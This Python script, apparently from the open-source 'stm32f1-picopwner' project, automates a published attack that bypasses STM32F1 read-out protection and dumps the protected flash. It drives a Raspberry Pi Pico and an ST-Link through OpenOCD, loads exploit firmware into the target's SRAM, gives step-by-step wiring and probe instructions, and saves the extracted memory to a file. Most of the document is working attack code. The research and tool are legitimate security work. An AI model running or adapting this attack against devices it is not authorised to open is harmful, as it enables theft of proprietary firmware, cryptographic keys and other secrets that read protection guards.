# Copyright (C) 2024 Patrick Pedersen

# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.

# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.

# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.

# The following script dumps the flash memory of a read-protected STM32F1 target
# device using a Pi Pico running the attack firmware, and a debug probe
# (ex. ST-Link).

# This attack is based on the works of:
#  Johannes Obermaier, Marc Schink and Kosma Moczek
# The relevant paper can be found here, particularly section H3:
#  https://www.usenix.org/system/files/woot20-paper-obermaier.pdf
# And the relevant code can be found here:
#  https://github.com/JohannesObermaier/f103-analysis/tree/master/h3
#

# Python Dependencies:
#  - pyserial
# OS Dependencies:
#  - openocd

import argparse
import time
import subprocess
import re
from pathlib import Path
from serial import Serial, SerialException

BAUDRATE = 9600
SCRIPT_VERSION = "1.5"
REQ_ATTACK_BOARD_VERSION = "1.x"
SERIAL_TIMEOUT_S = 0.5
SRAM_START = 0x20000000
MIN_OPENOCD_VERSION = "0.11.0"

script_path = Path(__file__).resolve()
default_targetfw_dir = str(script_path.parent / "target")

##############################################
# Helper functions
##############################################


# Prints "Pico Pwner" ASCII art
def print_ascii_art():
    print(
        "  ▄███████▄  ▄█   ▄████████  ▄██████▄          ▄███████▄  ▄█     █▄  ███▄▄▄▄      ▄████████    ▄████████ "
    )
    print(
        " ███    ███ ███  ███    ███ ███    ███        ███    ███ ███     ███ ███▀▀▀██▄   ███    ███   ███    ███ "
    )
    print(
        " ███    ███ ███▌ ███    █▀  ███    ███        ███    ███ ███     ███ ███   ███   ███    █▀    ███    ███ "
    )
    print(
        " ███    ███ ███▌ ███        ███    ███        ███    ███ ███     ███ ███   ███  ▄███▄▄▄      ▄███▄▄▄▄██▀ "
    )
    print(
        "▀█████████▀ ███▌ ███        ███    ███       ▀█████████▀ ███     ███ ███   ███ ▀▀███▀▀▀     ▀▀███▀▀▀▀▀   "
    )
    print(
        " ███        ███  ███    █▄  ███    ███        ███        ███     ███ ███   ███   ███    █▄  ▀███████████ "
    )
    print(
        " ███        ███  ███    ███ ███    ███        ███        ███ ▄█▄ ███ ███   ███   ███    ███   ███    ███ "
    )
    print(
        "▄████▀      █▀   ████████▀   ▀██████▀        ▄████▀       ▀███▀███▀   ▀█   █▀    ██████████   ███    ███ "
    )
    print(
        "                                                                                              ███    ███ "
    )


# Prints the metadata of the script (author, version, etc.)
def print_metadata():
    print("Credits: Johannes Obermaier, Marc Schink and Kosma Moczek")
    print("Author: Patrick Pedersen <ctx.xda@gmail.com>")
    print("Script Version: " + SCRIPT_VERSION)
    print("Requires Attack-Board Firmware Version: " + REQ_ATTACK_BOARD_VERSION)


# Prints the attack instructions
def print_instructions():
    print("Instructions:")
    print("")
    print("1. Flash the attack firmware to the Pi Pico")
    print("")
    print(
        "2. Connect the Pi Pico to the STM32F1 target as follows (left Pico, right STM):"
    )
    print("     GND     -> GND      ")
    print("     GPIO 0  -> NO LONGER USED (previously USARTx_RX)")
    print("     GPIO 1  -> USARTx_TX")
    print("     GPIO 2  -> VDD      ")
    print("     GPIO 4  -> NRST     ")
    print("     GPIO 5  -> BOOT0    ")
    print("")
    print("Where:")
    print("     USART1_TX = PA9")
    print("     USART2_TX = PA2")
    print("     USART3_TX = PB10")
    print("")
    print("3. Follow further instructions provided by this script")
    print("For more detailed steps, see the README.md file.")


# Prints welcome message
def print_welcome():
    print("")
    print_ascii_art()
    print_metadata()
    print("")
    print_instructions()
    print("")


# Returns true if the serial port is used
# Returns false if the serial port is not used
def serial_used(port: str):
    try:
        ser = Serial(port, BAUDRATE, timeout=SERIAL_TIMEOUT_S)
        ser.close()
        return True
    except SerialException:
        return False


# Waits until the serial port is no longer used
def wait_serial_disconnect(port: str):
    while True:
        if serial_used(port) == False:
            return
        time.sleep(1)


# Waits until the serial port becomes available
def wait_serial_connect(port: str):
    while True:
        try:
            ser = Serial(port, BAUDRATE, timeout=SERIAL_TIMEOUT_S)
            return ser
        except SerialException:
            time.sleep(1)
            continue


# Returns the version of openocd
def get_openocd_version():
    result = subprocess.run(["openocd", "-v"], capture_output=True, text=True)
    ver = None

    for line in result.stderr.splitlines():
        if "Open On-Chip Debugger " in line:
            ver = re.search(r"\d+\.\d+\.\d+", line)

            if ver == None:
                raise Exception("Could not determine openocd version")

            ver = ver.group(0).split(".")
            break

    return ver


# Returns true if the openocd version is greater than or equal to the given version
def openocd_version_geq(min_version: str):
    current = get_openocd_version()
    min = min_version.split(".")

    if len(min) != 3:
        raise Exception("Invalid version number: " + min_version + ", expected x.x.x")

    for i in range(3):
        if int(current[i]) > int(min[i]):
            return True
        elif int(current[i]) < int(min[i]):
            return False

    return True  # Versions are equal


# Executes openocd with the given list of commands
def openocd_run(interface: str, traget: str, cmds: list):
    splist = ["openocd", "-f", "interface/" + interface, "-f", "target/" + traget]

    for cmd in cmds:
        splist.append("-c")
        splist.append(cmd)

    return subprocess.run(splist, capture_output=True, text=True)


# Returns true if the debug probe is connected
# This is done by attempting to halt the target
# and checking if openocd returns a "halted" message
def debug_probe_connected():
    result = openocd_run(
        "stlink.cfg",
        "stm32f1x.cfg",
        ["init", "reset halt", "targets", "exit"],
    )

    for line in result.stderr.splitlines():
        if (
            "Error: open failed" in line
            or "Error: init mode failed (unable to connect to the target)" in line
        ):
            return False

    return True


# Waits until the debug probe is connected
def wait_dbg_probe_connect():
    while not debug_probe_connected():
        time.sleep(1)  # Wait for 1 second before retrying
    # Wait 2 seconds afterwards to ensure stable connections
    # Otherwise, it might make a momentary connection while messing with the wires, but fail later!
    time.sleep(2)


# Waits until the debug probe is disconnected
# This is done by attempting to halt the target
# until openocd returns an "open failed" error
# or a "init mode failed" error
def wait_dbg_probe_disconnect():
    while debug_probe_connected():
        time.sleep(1)


# Fetches the read protection status of the target
# True if read protection is enabled
# False if read protection is disabled
def get_rdp_status():
    result = openocd_run(
        "stlink.cfg",
        "stm32f1x.cfg",
        ["init", "reset halt", "stm32f1x options_read 0", "exit"],
    )

    for line in result.stderr.splitlines():
        if "read protection: on" in line:
            return True
        elif "read protection: off" in line:
            return False

    raise Exception(
        "Could not determine read protection status\nopenocd output: " + line
    )


# Returns the entry point address of the SRAM based on the reset vector
# See See https://github.com/CTXz/stm32f1-picopwner/issues/1#issuecomment-1603281043
def get_sram_entry_point():
    result = openocd_run(
        "stlink.cfg",
        "stm32f1x.cfg",
        ["init", "reset halt", "exit"],
    )

    for line in result.stderr.splitlines():
        pc_str = "pc: 0x20000"
        ret = line.find(pc_str)
        if ret != -1:
            lsb_3b_start = ret + len(pc_str)
            lsb_3b_end = lsb_3b_start + 3
            return int(line[lsb_3b_start:lsb_3b_end], 16)

    raise Exception("Could not determine SRAM entry point\nopenocd output: " + line)


# Checks if the provided entry point address is supported
# See See https://github.com/CTXz/stm32f1-picopwner/issues/1#issuecomment-1603281043
def sram_entry_offset_supported(entry_addr: int):
    return (entry_addr >= 0x100) and (entry_addr < 0x300)


# Uploads the target firmware to the SRAM of the target
def upload_target_fw(fw_path: str):
    result = openocd_run(
        "stlink.cfg",
        "stm32f1x.cfg",
        ["init", 'load_image "' + fw_path + '" ' + str(hex(SRAM_START)), "exit"],
    )

    for line in result.stderr.splitlines():
        if "Error:" in line:
            raise Exception(
                "Failed to load target firmware to SRAM\nopenocd output: " + line
            )


# Gets the correct target firmware binary based on the provided USART
def get_target_fw_bin(bin_path: str, usart: int):
    fname = "target_usart" + str(usart) + ".bin"
    path = bin_path + "/" + fname
    if Path(path).is_file():
        return path
    else:
        raise Exception(
            "Could not find target firmware binary: "
            + path
            + "\n Please buid or download the required target firmware binary first"
        )


##############################################
# Main
##############################################

parser = argparse.ArgumentParser(description="")
parser.add_argument("-o", "--output", help="Output file")
parser.add_argument(
    "-i", "--instructions", help="Print instructions and exit", action="store_true"
)
parser.add_argument(
    "-p",
    "--port",
    help="Serial port of Pi Pico",
    required=False,
    default="/dev/ttyACM0",
)
parser.add_argument(
    "-t",
    "--targetfw",
    help="Path to target firmware dir",
    required=False,
    default=default_targetfw_dir,
)
parser.add_argument(
    "-u",
    "--usart",
    help="USART used on the STM32F1 target to dump the firmware",
    choices=["1", "2", "3"],
)
args = parser.parse_args()

# If -i is specified, print instructions and exit
if args.instructions:
    print_instructions()
    exit(0)

# Check if openocd version is >= MIN_OPENOCD_VERSION
if not openocd_version_geq(MIN_OPENOCD_VERSION):
    print("Your OpenOCD version is too old:")
    print("Expected: >= " + MIN_OPENOCD_VERSION)
    print("Found: " + ".".join(get_openocd_version()))
    exit(1)

targetfw_path = Path(args.targetfw)

# Check if target firmware directory exists and is a directory
if targetfw_path.is_dir() == False:
    print(args.targetfw + " is not a directory")
    exit(1)

# Check if at least one .bin file is in the target firmware directory
if not list(targetfw_path.glob("*.bin")):
    print("No target firmware binaries found in " + args.targetfw)
    print(
        "Please build the target firmware binaries first or provide a directory with at least one target firmware binary"
    )
    exit(1)

# Print welcome message
print_welcome()

# If no output file is specified, forward output to /dev/null
fname = args.output
if fname is None:
    print("WARNING: No output file specified, dumping to /dev/null")
    fname = "/dev/null"

# Check if debug probe is already connected
# If so, request debug probe to be disconnected
# This is required to ensure the the target is power
# cycled when the Pi is reset/reconnected during the
# next step
if debug_probe_connected():
    print("Debug probe already connected, please disconnect the debug probe for now")
    wait_dbg_probe_disconnect()

# Check if pico is already connected to the specified serial port
# If so, request pico to be reset to ensure a clean state
if serial_used(args.port):
    print("Device already connected to " + args.port)
    print(
        "Please press the reset button on the Pi Pico or reconnect it to ensure a clean state"
    )
    wait_serial_disconnect(args.port)

# Wait for pico to be (re-)connected to the specified serial port
print("Waiting for Pi Pico to be connected... (Looking for " + args.port + ")")
ser = wait_serial_connect(args.port)

if ser.isOpen():
    print("Device connected to serial port " + args.port)
else:
    print("Failed to open serial port")
    exit(1)

# Wait for debug probe to be connected to the STM32F1 target
print("Waiting for debug probe (e.g. ST-Link) to be connected...")
wait_dbg_probe_connect()
print("Debug probe connected to STM32F1 target")

# Check if the STM32F1 target is read protected
# If not, ask the user if they want to continue
# with the attack anyway
rdp_status = get_rdp_status()
if rdp_status:
    print("STM32F1 target is confirmed to be read protected")
else:
    print("STM32F1 target is not read protected, the attack may not be necessary")
    print("Do you wish to continue anyway? (y/n): ", end="")
    while True:
        choice = input().lower()
        if choice == "y":
            break
        elif choice == "n":
            ser.close()
            exit(0)
        else:
            print("Please respond with 'y' or 'n'")

# Get the entry point address of the SRAM
sram_entry_point = get_sram_entry_point()
print(
    "Detected SRAM entry point offset: "
    + str(hex(sram_entry_point))
    + " ("
    + str(hex(0x20000000 + sram_entry_point))
    + ")"
)
if sram_entry_offset_supported(sram_entry_point) == False:
    print(
        "SRAM entry point offset "
        + str(hex(sram_entry_point))
        + " is not supported, expected: 0x100-0x2FF"
    )
    print("If you believe this is a valid entry point, please submit an issue")
    exit(1)

# Select USART if not provided alreay
if args.usart is None:
    print("Please select the USART used by the STM32F1 target to dump firmware")
    print("1: USART1 - TX: PA9")
    print("2: USART2 - TX: PA2")
    print("3: USART3 - TX: PB10")
    print("Enter 1, 2 or 3: ", end="")
    while True:
        choice = input()
        if choice == "1":
            usart = "1"
            break
        elif choice == "2":
            usart = "2"
            break
        elif choice == "3":
            usart = "3"
            break
        else:
            print("Please enter 1, 2 or 3: ", end="")
else:
    usart = args.usart

# Upload the target firmware to the SRAM
print("Press enter to load the target exploit firmware to the SRAM")
input()
upload_target_fw(get_target_fw_bin(args.targetfw, usart))
print("Target firmware loaded to the SRAM")

# Ensure user disconnects the debug probe from the target
print("Waiting for debug probe to be disconnected...")
print(
    "Warning: Disconnect the debug probe from the target, not just the host USB port!"
)
wait_dbg_probe_disconnect()
print("Debug probe disconnected from STM32F1 target")

with open(fname, "wb") as f:
    # Wait for user input to launch attack
    print("")
    print("Attack ready")
    print("Press enter to start dumping firmware")
    input()
    ser.write(b"1")

    # Enable timeout as we'll use this to detect when the attack is done
    ser.timeout = SERIAL_TIMEOUT_S

    # Read dump from serial port
    read_bytes = 0
    while True:
        data = ser.read()

        # Check if we've timed out
        if len(data) == 0:
            break

        f.write(data)

        if read_bytes % 16 == 0:
            print("\n" + hex(0x8000000 + read_bytes) + ": ", end="")

        # Convert to hex string and print
        data = data.hex()
        print(" " + data, end="")

        # Beak line every 16 bytes
        read_bytes += 1

    # Check if we managed to read any data
    # If we haven't, something went wrong
    # If we have, the dump is probably complete
    if read_bytes == 0:
        print("")
        print("Timeout: No data received from target")
        print("Please consult the README for troubleshooting steps")
        ser.close()
        exit(1)
    else:
        print("")
        print("Target has stopped sending data, assuming dump is complete")
        print("Dumped " + str(read_bytes) + " bytes")

    if fname != "/dev/null":
        print("Output saved to " + fname)

ser.close()
